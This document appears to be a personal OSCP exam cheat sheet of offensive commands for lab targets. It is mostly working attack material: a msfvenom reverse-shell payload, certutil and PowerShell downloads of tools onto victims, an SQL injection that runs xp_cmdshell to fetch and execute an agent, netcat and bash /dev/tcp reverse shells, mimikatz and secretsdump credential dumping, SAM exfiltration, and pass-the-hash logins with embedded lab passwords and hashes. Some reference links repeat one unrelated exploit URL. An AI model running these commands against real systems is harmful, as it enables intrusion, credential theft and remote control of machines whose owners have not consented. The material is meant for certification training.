# OSCP cheat sheet

# Other resources to consult

[Daniel-Ayz](https://github.com/Daniel-Ayz/OSCP)

[xsudoxx](https://github.com/xsudoxx/OSCP)

[0xsyr0](https://github.com/0xsyr0/OSCP)

## autorecon

```jsx
sudo autorecon 192.168.193.153
```

```jsx
sudo autorecon targets.txt
```

## FTP

<aside>
Login to ftp, login:pass to enter in prompt
</aside>

```jsx
ftp 192.168.202.149
```

<aside>
Download all FTP connected locally
</aside>

```jsx
wget -m ftp://anonymous:anonymous@192.168.216.157
```

## msfvenom

<aside>
Use https://www.revshells.com/#msfvenom to select the right shell type
</aside>

```jsx
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.231.122 LPORT=80
```

## File Transfers

<aside>
Also other techniques exits, like using FTP and SMB shares by simply by uploading & downloading the files.
</aside>

### From attacker (kali) → Victim

#### Python webserver

<aside>
Start python webserver on Kali
</aside>

```jsx
python -m http.server 8080
```

<aside>
Run on victims file system
</aside>

```jsx
wget http://192.168.45.212:8080/exploit.py
curl http://192.168.45.213:8080/exploit.ps1
```

<aside>
Windows specific
</aside>

```jsx
certutil -split -urlcache -f http://192.168.45.217:8080/nc64.exe c:\Users\Administrator\Documents\nc64.exe
powershell iwr -uri http://192.168.45.237:8080/sql.exe -OutFile C:/Users/Public/sql.exe
Invoke-WebRequest -Uri http://10.10.93.141:8080/winPEASx64.exe -OutFile wp.exe
```

#### SMB

```jsx
impacket-smbserver data . -smb2support
net use \\<kali-ip>\data
copy local.txt \\<kali-ip>\\data\local.txt
```

### From victim → attacker (Kali)

#### SMB

<aside>
Copy the file to diretory to transfer
</aside>

```jsx
copy C:\windows.old\Windows\System32\SAM C:\users\Public\SAM
```

<aside>
Give public access folder (if not done yet)
</aside>

```jsx
icacls "c:\users\public" /grant "Everyone:(F)" /T
net share sam='c:\users\public' /grant:Everyone,FULL
```

<aside>
Log in to SMB
</aside>

```jsx
smbclient //10.10.112.154/sam -U 'oscp.exam/user%pass'
```

<aside>
Download context from SMB
</aside>

```jsx
get <filename>
```

#### SCP

```jsx
scp f.frizzle@10.10.11.60:C:\Users\f.frizzle\re2.7z /home/kali/oscp/TheFrizz
```

#### Apache

<aside>
Start Apache webserver on victims machine
</aside>

```jsx
service apache2 start
```

```jsx
wget http://192.168.45.212:8080/exploit.py
curl http://192.168.45.213:8080/exploit.ps1
```

#### NC

```jsx
nc -l -p 4443 > file.b64
nc 192.168.45.213 4443 < file.b64

```
#### Powershell (in the body)

<aside>
Send encoded file conted in base64 in the body of a request
</aside>

```jsx
Invoke-WebRequest -Uri http://10.10.14.163:4444 -Method POST -DisableKeepAlive -Timeout 10 -Body $b64;
```

<aside>
Retrieve data on Kali
</aside>

```jsx
cat file.b64 | sed -n '8,$'p | base64 -d > file.txt
```

## Interactive shell

```jsx
/bin/sh -i
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```

## BloodHound

```jsx
python bloodhound.py -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -ns 192.168.119.122 -c All
bloodhound-python -u Fiona.Clarck -p Summer2023 -d nagoya-industries.com -v --zip -c All -dc nagoya-industries.com -ns 192.168.119.122
```
If 'bloodhound-python' is not found you can use the command with the full path "sudo python /home/kali/.local/bin/bloodhound-python"

## LDAP

```jsx
ldapsearch -x -v -H "ldap://192.168.231.122" -D 'CN=Configuration,DC=hutch,DC=offsec' -W -b 'DC=hutch,DC=offsec' >ldapsearch.txt
ldapsearch -v -x -b "DC=hokkaido-aerospace,DC=com" -H "ldap://$ip" "(objectclass=*)"
nmap -n -sV --script "ldap* and not brute" 192.168.231.122
```

## Kerberos

```jsx
impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb
export KRB5CCNAME=<USERNAME>.ccache
impacket-GetUserSPNs -request -dc-ip 10.10.150.146 oscp.exam/web_svc
```

## xp_cmdshell 

```jsx
impacket-mssqlclient sql_svc:'Dolphin1'@10.10.111.148 -windows-auth
enable_xp_cmdshell
xp_cmdshell whoami
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

EXECUTE xp_cmdshell 'powershell iwr -uri http://192.168.45.237:4444/sql.exe -OutFile C:/Users/Public/sql.exe';
EXECUTE xp_cmdshell 'certutil -split -urlcache -f http://192.168.45.237:8080/chisel.exe C:\Users\eric.wallows\chisel.exe';

' UNION SELECT NULL,NULL;EXEC xp_cmdshell 'certutil -split -urlcache -f http://192.168.45.217:8000/agent.exe c:\windows\temp\agent.exe';--
' UNION SELECT NULL,NULL;EXEC xp_cmdshell 'c:\windows\temp\rp.exe'--
```

## Ligolo

<aside>
On Kali
</aside>

```jsx
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8888
```

<aside>
On Windows (after the agent.exe file is transfered)
</aside>

```jsx
.\agent.exe -connect 192.168.45.188:8888 -ignore-cert
```

<aside>
On Kali
</aside>

```jsx
session and select session with enter-key
autoroute
```

<aside>
if problems with autoroute
</aside>

```jsx
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.161.0/24 dev ligolo
```
### NMAP (with ligolo)

<aside>
Run fast nmap over list of targets:
</aside>

```jsx
sudo nmap -Pn -iL targets.txt

```

<aside>
Run slow nmap over list of targets:
</aside>

```jsx
 sudo nmap -Pn -sC -sV -iL targets.txt
```

## Users & groups (Windows)
```jsx
whoami
whoami /priv
whoami /groups
net user
net user /domain
Get-LocalUser
net user steve
Get-LocalUser steve
net group
net group /domain
Get-LocalGroup
Get-LocalGroupMember Administrators
net localgroup administrators
```

## hashcat

```jsx
hashcat -m 1000 roothash.txt /usr/share/wordlists/rockyou.txt 
```

```jsx
1000 for NTLM
1800 for SHA-512crypt
18200 for asreproasting
13100 for kerberoasting 
```

## connect to local SQL server on Windows

```jsx
.\mysql.exe -u root -h localhost -e "show databases;"
.\mysql.exe -u root -h localhost -e "use creds; show tables;select * from creds;"
```

## mimikatz

```jsx
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::msv" "lsadump::sam" "exit"
```

## ssh

<aside>
Giving the right accesses to  id_rsa 
</aside>

```jsx
cp .ssh/id_rsa.pub .ssh/authorized_keys
```

```jsx
chmod 600 id_rsa
```

```jsx
ssh -i 'id_rsa' john@192.168.202.149
```

<aside>
 https://serverfault.com/questions/989678/locked-out-of-my-own-server-getting-too-many-authentication-failures-right-aw
</aside>

```jsx
ssh -o "IdentitiesOnly yes" -i root root@127.0.0.1
```

## SeImpersonatePrivilege

```jsx
.\PrintSpoofer64.exe -i -c powershell.exe
```

```jsx
.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "whoami"
.\JuicyPotatoNG.exe -t * -p "C:\Users\Public\nc64.exe" -a "10.10.111.147 4444 -e cmd.exe"
.\JuicyPotatoNG.exe -t * -p "C:\Users\tony\Desktop\rev.exe"
```

```jsx
.\Potatox86.exe -t * -p "C:\wamp\www\nc.exe" -a "192.168.45.158 1234 -e cmd.exe" -l 9090 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
```

### Overview with common builds

| Windows release (example build)                           |                                               PrintSpoofer |                                                JuicyPotato |                                       RoguePotato |                                          JuicyPotatoNG |                                      GodPotato / GodPotato-NG | Notes / Key mitigations                                                                           |
| --------------------------------------------------------- | ---------------------------------------------------------: | ---------------------------------------------------------: | ------------------------------------------------: | -----------------------------------------------------: | ------------------------------------------------------------: | ------------------------------------------------------------------------------------------------- |
| **Windows 7 / Server 2008 R2** (6.1 / ≤7601)              |                                                    ✅ Works |                                                    ✅ Works |                                           ✅ Works |                                                ✅ Works |                                                       ✅ Works | Classic PoCs fully reliable; older kernel and RPC behavior.                                       |
| **Windows 8 / 8.1** (6.2 / 6.3 / ≤9600)                   |                                                    ✅ Works |                                                    ✅ Works |                                           ✅ Works |                                                ✅ Works |                                                       ✅ Works | Similar to Win7-era; no major mitigations present.                                                |
| **Windows 10 1507 → 1709** (10240 / 14393 / 16299)        |                                                    ✅ Works |                                                    ✅ Works |                                           ✅ Works |                                                ✅ Works |                                                       ✅ Works | All PoCs functional on unpatched installs; early Win10 builds vulnerable.                         |
| **Windows 10 1803 / 1809** (17134 / 17763)                |                                        ✅ Works (pre-patch) | ⚠️ Works on unpatched; reliability drops after cumulatives |                          ✅ RoguePotato fills gaps |                                       ⚠️ Mixed results |                                           ✅ Works (pre-patch) | Microsoft patches (2019–2021) changed RPC/COM behavior; RoguePotato improves reliability.         |
| **Windows 10 1903 / 1909** (18362 / 18363)                |          ⚠️ Works if unpatched; mitigated by July‑2021 KBs |      ⚠️ Works on unpatched; may fail post‑KB5004946 (1909) |                         ✅ Often works (pre-patch) |                                       ⚠️ Mixed results |                ✅ Works on unpatched; mitigated by cumulatives | Cumulative updates reduce exploitability; patch level critical.                                   |
| **Windows 10 2004 / 20H2 / 21H1** (19041 / 19042 / 19043) | ⚠️ Works on unpatched; mitigated after July‑2021 KB5004945 |                                         ⚠️ Works pre-patch |                 ✅ RoguePotato effective pre-patch |                 ⚠️ Mixed; NG variants try newer builds |                   ⚠️ May work on unpatched / specific configs | July‑2021 OOB updates hardened named pipes / RPC endpoints; configuration-dependent.              |
| **Windows 10 21H2 / 22H2** (19044 / 19045 / 22621)        |                                      ❌ Generally mitigated |                                      ❌ Largely ineffective | ⚠️ RoguePotato may work in rare unpatched configs |                               ⚠️ Limited / conditional | ⚠️ NG variants claim some coverage depending on configuration | Newer Win10/11 builds hardened RPC, COM, impersonation, and print-spooler services.               |
| **Windows 11 / Server 2022** (22000 / 20348+)             |                                            ❌ Not effective |                                            ❌ Not effective |                                   ❌ Not effective |                        ⚠️ NG variants very conditional |           ⚠️ NG variants may work in some research/test cases | Modern LPE mitigations; successful PoC extremely rare; depends on patch level and service config. |
| **Windows Server 2016** (14393)                           |                                        ✅ Works (pre-patch) |                                                    ✅ Works |                                           ✅ Works |                                 ⚠️ Mixed / conditional |                                           ✅ Works (pre-patch) | Cumulative updates affect success; early PoCs reliable.                                           |
| **Windows Server 2019** (17763)                           |                                       ⚠️ Works (pre-patch) |                                       ⚠️ Works (pre-patch) |                       ✅ RoguePotato more reliable |                         ⚠️ Mixed; NG variants may work |                            ⚠️ GodPotato may succeed pre-patch | Patches (e.g., July‑2021 KBs) mitigate most classic PoCs.                                         |
| **Windows Server 2022** (20348+)                          |                                      ❌ Generally mitigated |                                            ❌ Not effective |                                   ❌ Not effective | ⚠️ NG variants possible only in research / conditional |           ⚠️ NG variants may work in research; not guaranteed | Modern hardening; fully patched builds prevent classic LPE exploits.                              |

## impacket-secretsdump

<aside>
SAM & LSA extracation
</aside>

```jsx
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

## evil-winrm

<aside>
Connect with NTLM hash and pass
</aside>

```jsx
evil-winrm -i 10.10.111.146 -u "tom_admin" -H 4979d69d4ca66955c075c41cf45f24dc
evil-winrm -i 10.10.112.154 -u 'Administrator' -p 'hghgib6vHT3bVWf'
```

## smbclient

```jsx
smbclient -L 192.168.221.189 -N 
smbclient //10.10.111.148/ -U 'oscp.exam/web_svc%Diamond1'
smbclient -U 'guest' \\\\<smb $IP>\\<share name>
prompt off
recurse on
mget *
```


## GPGOrchestrator

<aside>
More info on: https://www.exploit-db.com/exploits/50558
</aside>

```jsx
ren GPGService.exe GPGServiceOLD.exe
ren evil.exe GPGService.exe
smbclient -U 'guest' \\\\<smb $IP>\\<share name>
net stop GPGOrchestrator
net start GPGOrchestrator
```
## wilcards

<aside>
More info on: https://www.exploit-db.com/exploits/50558
</aside>

```jsx
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
echo 'bash -i >& /dev/tcp/192.168.45.212/4444 0>&1' > shell.sh
chmod +x shell.sh
```
## snmpwalk

<aside>
More info on: https://www.exploit-db.com/exploits/50558
</aside>

```jsx
snmpwalk -v1 -c public 192.168.220.156
snmpwalk -v1 -c public 192.168.220.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

## sudo -l

Check always https://gtfobins.github.io/

# PHP

```jsx
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```















## Misc

<aside>
Convert file to base64 variable (Powershell)
</aside>

```jsx
$b64 = [System.convert]::ToBase64String((Get-Content -Path '.\$RE2XMEG.7z' -Encoding Byte));
```

<aside>
Show hidden dirs in windows (Powershell)
</aside>

```jsx
Get-ChildItem . -Force
```

<aside>
Get file info (Powershell)
</aside>

```jsx
Get-ItemProperty -Path C:\Users\eric.wallows\admintool.exe | Format-list -Property * -Force
```

<aside>
See file rights (Powershell)
</aside>

```jsx
Get-Acl .\admintool.exe
```
<aside>
Powershell history
</aside>

```jsx
(Get-PSReadlineOption).HistorySavePath
cat C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

<aside>
Print time of the host
</aside>

```jsx
sudo rdate -n 10.10.11.60
```

<aside>
Git dump from web
</aside>

```jsx
./gitdumper.sh http://bullybox.local/.git/ .
git show ccf7c701c4bd22484cbe5d9f8f92511261aadef0:bb-config.php
```

<aside>
Get file info on windows
</aside>

```jsx
<filename> qc
```

<aside>
Extra meta data with exiftool
</aside>

```jsx
exiftool -a -G1 FUNCTION-TEMPLATE.pdf
```

<aside>
Extra data with strings
</aside>

```jsx
strings /usr/local/bin/redis-status
```

